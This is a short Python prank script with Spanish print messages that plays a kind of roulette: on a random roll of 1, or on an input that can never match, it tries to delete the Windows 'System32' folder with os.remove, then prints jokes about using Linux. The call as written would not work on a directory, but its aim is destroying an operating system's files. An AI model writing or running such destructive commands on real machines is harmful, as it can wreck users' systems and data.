import random
import os
tmp=random.randint(0,6)
print(tmp,"debe ser 1")
if tmp==1:
  os.remove("C:\Windows\System32")
  print("mori pero estoy en linux")
else:print("fallo")
i=input()
if "a"==i and i=="autokill":
   print('preparandose para correr\nos.remove("C:\Windows\System32")')
   os.remove("C:\Windows\System32")
   print("yo uso linux,prro")
